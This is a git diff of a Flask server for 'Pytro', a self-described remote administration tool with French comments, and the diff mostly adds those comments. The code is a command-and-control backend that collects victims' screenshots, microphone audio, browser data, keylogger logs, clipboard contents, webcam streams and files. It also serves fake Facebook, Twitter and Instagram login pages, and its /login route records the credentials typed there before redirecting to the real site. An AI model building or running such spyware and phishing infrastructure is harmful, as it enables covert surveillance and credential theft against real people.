@@ -19,6 +19,7 @@ from config.config import Config
 from config.extensions import db
 from models import Client, Command, CommandType
 
+# Variables globales et initialisation
 app = Flask(__name__, template_folder='ressources/templates', static_folder='ressources/static')
 app.config.from_object(Config)
 app.config['DEBUG'] = True
@@ -27,9 +28,7 @@ migrate = Migrate(app, db)
 jwt = JWTManager(app)
 video_frames = {}
 battery_status = {}
-
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=50 ** 8)
-
 authorizations = {
     'bearer_auth': {
         'type': 'apiKey',
@@ -37,11 +36,11 @@ authorizations = {
         'name': 'Authorization'
     }
 }
-
 api = Api(app, version='1.0', title='Pytro API Documentation',
           description='API Documentation for Pytro, a remote administration tool.',
           authorizations=authorizations)
 
+# Création des namespaces
 auth_ns = api.namespace('api/v1/auth', description='Authentication operations')
 command_ns = api.namespace('api/v1/command', description='Command operations')
 clients_ns = api.namespace('api/v1/clients', description='Client operations')
@@ -54,6 +53,7 @@ clipboard_ns = api.namespace('api/v1/clipboard', description='Clipboard operatio
 download_file_ns = api.namespace('api/v1/download', description='Download file operations')
 directory_ns = api.namespace('api/v1/directory', description='Directory operations')
 
+# Modèles pour la documentation de l'API
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
     'command': fields.String(required=True, description='Commande à exécuter'),
@@ -104,10 +104,12 @@ directory_model = api.model('Directory', {
     'dir_path': fields.String(required=True, description='Chemin du répertoire à lister')
 })
 
+# Paramètres pour la documentation de l'API
 client_params = api.parser()
 client_params.add_argument('status', type=str, required=False, help='Filter clients by their status (online/offline).')
 
 
+# Filtre pour supprimer les couleurs dans les logs afin de ne pas avoir des caractères spéciaux dans les logs
 class RemoveColorFilter(logging.Filter):
     def filter(self, record):
         if record.args:
@@ -116,6 +118,8 @@ class RemoveColorFilter(logging.Filter):
             record.msg = click.unstyle(record.msg)
         return True
 
+
+# Handler personnalisé pour la rotation des fichiers de logs
 class CustomRotatingFileHandler(RotatingFileHandler):
     def doRollover(self):
         """
@@ -142,6 +146,7 @@ class CustomRotatingFileHandler(RotatingFileHandler):
             self.stream = self._open()
 
 
+# Fonction pour initialiser les logs
 def setup_logging():
     log_directory = os.path.join(os.getcwd(), 'logs')
     os.makedirs(log_directory, exist_ok=True)
@@ -175,6 +180,7 @@ def setup_logging():
     werkzeug_logger.addFilter(RemoveColorFilter())
 
 
+# Route pour générer un token JWT
 @auth_ns.route('/')
 class Authenticate(Resource):
     @auth_ns.expect(auth_model)
@@ -189,6 +195,7 @@ class Authenticate(Resource):
             return {"msg": "Mauvaise clé secrète"}, 401
 
 
+# Route pour envoyer une commande à un client
 @command_ns.route('/<int:client_id>')
 class HandleCommand(Resource):
     @jwt_required()
@@ -221,6 +228,7 @@ class HandleCommand(Resource):
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
+# Route pour récupérer la liste des clients
 @clients_ns.route('/')
 class GetClients(Resource):
     @jwt_required()
@@ -240,6 +248,7 @@ class GetClients(Resource):
         return clients, 200
 
 
+# Route pour récupérer les captures d'écran par client
 @screenshot_ns.route('/client/<int:client_id>')
 class GetScreenshotsByClientId(Resource):
     @jwt_required()
@@ -254,6 +263,7 @@ class GetScreenshotsByClientId(Resource):
         return screenshots, 200
 
 
+# Route pour récupérer une capture d'écran
 @screenshot_ns.route('/image/<int:screenshot_id>')
 class GetScreenshotImage(Resource):
     @jwt_required()
@@ -268,6 +278,7 @@ class GetScreenshotImage(Resource):
             return {'status': 'error', 'message': 'Capture d\'écran non trouvée.'}, 404
 
 
+# Route pour récupérer les enregistrements audio par client
 @microphone_ns.route('/client/<int:client_id>')
 class GetMicrophonesByClientId(Resource):
     @jwt_required()
@@ -282,6 +293,7 @@ class GetMicrophonesByClientId(Resource):
         return microphones, 200
 
 
+# Route pour récupérer un enregistrement audio
 @microphone_ns.route('/audio/<int:microphone_id>')
 class GetMicrophoneAudio(Resource):
     @jwt_required()
@@ -297,6 +309,7 @@ class GetMicrophoneAudio(Resource):
             return {'status': 'error', 'message': 'Enregistrement audio non trouvé.'}, 404
 
 
+# Route pour récupérer les données du navigateur par client
 @browser_ns.route('/client/<int:client_id>/<string:browser_name>')
 class GetBrowserDataByClientId(Resource):
     @jwt_required()
@@ -312,6 +325,7 @@ class GetBrowserDataByClientId(Resource):
         return browser_data, 200
 
 
+# Route pour récupérer un fichier de données du navigateur
 @browser_ns.route('/data/<int:browser_id>')
 class GetBrowserDataFile(Resource):
     @jwt_required()
@@ -327,6 +341,7 @@ class GetBrowserDataFile(Resource):
             return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404
 
 
+# Route pour récupérer les enregistrements du clavier par client
 @keylogger_ns.route('/client/<int:client_id>')
 class GetKeyloggersByClientId(Resource):
     @jwt_required()
@@ -339,6 +354,7 @@ class GetKeyloggersByClientId(Resource):
         return keyloggers, 200
 
 
+# Route pour récupérer un fichier d'enregistrement du clavier
 @keylogger_ns.route('/log/<int:keylogger_id>')
 class GetKeyloggerLog(Resource):
     @jwt_required()
@@ -351,6 +367,7 @@ class GetKeyloggerLog(Resource):
             return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
 
 
+# Route pour récupérer les clipboards par client
 @clipboard_ns.route('/client/<int:client_id>')
 class GetClipboardsByClientId(Resource):
     @jwt_required()
@@ -363,6 +380,7 @@ class GetClipboardsByClientId(Resource):
         return clipboards, 200
 
 
+# Route pour récupérer un fichier de clipboard
 @clipboard_ns.route('/content/<int:clipboard_id>')
 class GetClipboardFile(Resource):
     @jwt_required()
@@ -375,6 +393,7 @@ class GetClipboardFile(Resource):
             return {'status': 'error', 'message': 'Fichier du clipboard non trouvé.'}, 404
 
 
+# Route pour générer un lien pour activer la webcam d'un client
 @webcam_ns.route('/link/<int:client_id>')
 class GetWebcamLink(Resource):
     @jwt_required()
@@ -394,6 +413,7 @@ class GetWebcamLink(Resource):
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
+# Route pour arrêter la webcam d'un client
 @webcam_ns.route('/stop/<int:client_id>')
 class StopWebcam(Resource):
     @jwt_required()
@@ -409,6 +429,7 @@ class StopWebcam(Resource):
         return {'status': 'success', 'message': 'Commande pour arrêter la webcam envoyée.'}, 200
 
 
+# Route pour streamer la webcam d'un client
 @webcam_ns.route('/<int:client_id>')
 class StreamWebcam(Resource):
     def get(self, client_id):
@@ -429,6 +450,7 @@ class StreamWebcam(Resource):
         return Response(stream_frames(client_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
+# Route pour lister les fichiers et répertoires d'un client
 @directory_ns.route('/client/<int:client_id>')
 class ListDirectory(Resource):
     @jwt_required()
@@ -473,6 +495,7 @@ class ListDirectory(Resource):
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
+# Route pour récupérer les fichiers téléchargés par client
 @download_file_ns.route('/client/<int:client_id>')
 class ListDownloadFile(Resource):
     @jwt_required()
@@ -485,6 +508,7 @@ class ListDownloadFile(Resource):
         return download_files, 200
 
 
+# Route pour récupérer un fichier téléchargé
 @download_file_ns.route('/file/<int:download_file_id>')
 class GetDownloadFile(Resource):
     @jwt_required()
@@ -497,6 +521,7 @@ class GetDownloadFile(Resource):
             return {'status': 'error', 'message': 'Fichier non trouvé.'}, 404
 
 
+# Évènement lorsqu'un client se connecte
 @socketio.on('connect', namespace='/')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -513,6 +538,7 @@ def handle_connect():
     db.session.commit()
 
 
+# Évènement lorsqu'un client envoie des informations système
 @socketio.on('system_info')
 def handle_system_info(data):
     sid = request.sid
@@ -524,6 +550,7 @@ def handle_system_info(data):
         db.session.commit()
 
 
+# Évènement lorsqu'un client envoie une capture d'écran
 @socketio.on('screenshot_response')
 def handle_screenshot(data):
     screenshot_bytes = base64.b64decode(data.get('screenshot'))
@@ -545,6 +572,7 @@ def handle_screenshot(data):
         app.logger.info(f"Capture d'écran reçue de {client_ip} et enregistrée sous {screenshot_path}")
 
 
+# Évènement lorsqu'un client envoie un enregistrement audio
 @socketio.on('audio_response')
 def handle_audio(data):
     audio_bytes = base64.b64decode(data.get('audio'))
@@ -565,6 +593,7 @@ def handle_audio(data):
         app.logger.info(f"Enregistrement audio reçu de {client_ip} et enregistré sous {audio_path}")
 
 
+# Évènement lorsqu'un client envoie des données de navigateur
 @socketio.on('browser_data_response')
 def handle_browser_data(data):
     sid = request.sid
@@ -591,6 +620,7 @@ def handle_browser_data(data):
         app.logger.info(f"Données du navigateur reçues de {client.ip} et enregistrées sous {file_path}")
 
 
+# Évènement lorsqu'un client envoie un journal des touches
 @socketio.on('keyboard_response')
 def handle_keyboard(data):
     sid = request.sid
@@ -617,6 +647,7 @@ def handle_keyboard(data):
         app.logger.info(f"Journal des touches reçu de {client.ip} et enregistré sous {keylogger_path}")
 
 
+# Évènement lorsqu'un client envoie le contenu du clipboard
 @socketio.on('clipboard_response')
 def handle_clipboard(data):
     sid = request.sid
@@ -641,12 +672,14 @@ def handle_clipboard(data):
         app.logger.info(f"Contenu du clipboard reçu de {client.ip} et enregistré sous {clipboard_path}")
 
 
+# Évènement lorsqu'un client envoie des informations sur la batterie
 @socketio.on('battery_status')
 def handle_battery_status(data):
     sid = request.sid
     battery_status[sid] = data
 
 
+# Évènement lorsqu'un client envoie le flux vidéo de la webcam
 @socketio.on('webcam_response')
 def handle_frame(data):
     user_id = data.get('user_id')
@@ -656,6 +689,7 @@ def handle_frame(data):
     video_frames[user_id].put(frame_data)
 
 
+# Évènement lorsqu'un client envoie les frames de la webcam
 @socketio.on('start_stream')
 def handle_start_stream(data):
     user_id = data.get('user_id')
@@ -666,6 +700,7 @@ def handle_start_stream(data):
         app.logger.info(f"L'utilisateur {user_id} est déjà dans video_frames.")
 
 
+# Évènement lorsqu'un client arrête le streaming de la webcam
 @socketio.on('stop_stream')
 def handle_stop_stream(data):
     user_id = data.get('user_id')
@@ -674,6 +709,7 @@ def handle_stop_stream(data):
         del video_frames[user_id]
 
 
+# Évènement lorsqu'un client envoie un fichier
 @socketio.on('file_response')
 def handle_file(data):
     file_data = base64.b64decode(data.get('file'))
@@ -694,6 +730,7 @@ def handle_file(data):
         app.logger.info(f"Fichier reçu de {client_ip} et enregistré sous {file_path}")
 
 
+# Évènement lorsqu'un client envoie une liste de répertoires
 @socketio.on('directory_listing_response')
 def handle_directory_listing(data):
     directory_listing = data.get('directory_listing')
@@ -704,6 +741,7 @@ def handle_directory_listing(data):
         app.logger.info(f"Liste des répertoires reçue de {client.ip}")
 
 
+# Évènement lorsqu'un client se déconnecte
 @socketio.on('disconnect')
 def handle_disconnect():
     sid = request.sid
@@ -715,6 +753,7 @@ def handle_disconnect():
         app.logger.info(f"Client déconnecté: {client.ip}")
 
 
+# Fonction pour streamer les frames de la webcam
 def stream_frames(user_id):
     time.sleep(1)
 
@@ -733,26 +772,31 @@ def stream_frames(user_id):
             break
 
 
+# Route pour rediriger vers la page de connexion Facebook
 @app.route('/')
 def home():
     return redirect(url_for('fake_facebook'))
 
 
+# Route pour afficher la page de connexion Facebook
 @app.route('/facebook')
 def fake_facebook():
     return render_template('facebook.html')
 
 
+# Route pour afficher la page de connexion Twitter
 @app.route('/twitter')
 def fake_twitter():
     return render_template('twitter.html')
 
 
+# Route pour afficher la page de connexion Instagram
 @app.route('/instagram')
 def fake_instagram():
     return render_template('instagram.html')
 
 
+# Route pour gérer la connexion, enregistrer les données et rediriger vers la vraie page de connexion
 @app.route('/login', methods=['POST'])
 def login():
     # Vérifiez que tous les champs nécessaires sont présents
@@ -782,6 +826,7 @@ def login():
 
 setup_logging()
 if __name__ == '__main__':
+    # Démarrage du serveur Flask
     eventlet.wsgi.server(eventlet.wrap_ssl(eventlet.listen(('0.0.0.0', 5000)),
                                            certfile='cert.pem',
                                            keyfile='key.pem',
